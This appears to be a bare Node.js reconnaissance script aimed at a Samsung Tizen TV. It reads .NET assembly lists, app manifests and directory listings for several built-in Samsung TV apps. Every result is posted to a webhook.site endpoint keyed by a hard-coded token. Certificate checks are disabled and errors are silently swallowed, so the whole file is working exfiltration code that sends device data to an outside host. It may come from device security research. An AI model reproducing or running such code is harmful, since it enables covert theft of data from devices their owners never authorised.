var fs = require('fs');
var https = require('https');
var TOKEN = '14750775-fef3-408e-8214-35e34b90591f';
function send(p, b) {
    try {
        var r = https.request({
            hostname: 'webhook.site',
            path: '/' + TOKEN + '/' + p,
            method: 'POST',
            rejectUnauthorized: false
        }, function () {});
        r.on('error', function () {});
        r.end(b);
    } catch (e) {}
}
function read(p, max) {
    try {
        var s = fs.readFileSync(p, 'utf8');
        send('tpa', p + ' len=' + s.length + '\n' + s.slice(0, max));
    } catch (e) {
        send('tpa', p + ' ERR ' + e);
    }
}
read('/opt/usr/home/owner/share/dotnet/TPA.txt', 6000);
read('/opt/usr/home/owner/share/dotnet/CoBA.txt', 6000);
try {
    send('tpa', 'dotnet-dir: ' + fs.readdirSync('/opt/usr/home/owner/share/dotnet').join(','));
} catch (e) {
    send('tpa', 'dotnet-dir ERR ' + e);
}
try {
    var apps = fs.readdirSync('/usr/apps').filter(function (n) { return /^com\.samsung\.tv/.test(n); });
    send('tpa', 'usr-apps-tv: ' + apps.join(','));
} catch (e) {
    send('tpa', 'usr-apps ERR ' + e);
}
['com.samsung.tv.gallery', 'com.samsung.tv.weather-viewer', 'com.samsung.tv.mybixby', 'com.samsung.tv.store', 'com.samsung.tv.csa', 'com.samsung.tv.photoblueline3-tpl'].forEach(function (id) {
    read('/usr/apps/' + id + '/tizen-manifest.xml', 3000);
    ['bin', 'lib', 'res'].forEach(function (sub) {
        try {
            send('tpa', id + '/' + sub + ': ' + fs.readdirSync('/usr/apps/' + id + '/' + sub).slice(0, 30).join(','));
        } catch (e) {
            send('tpa', id + '/' + sub + ' ERR ' + e);
        }
    });
});
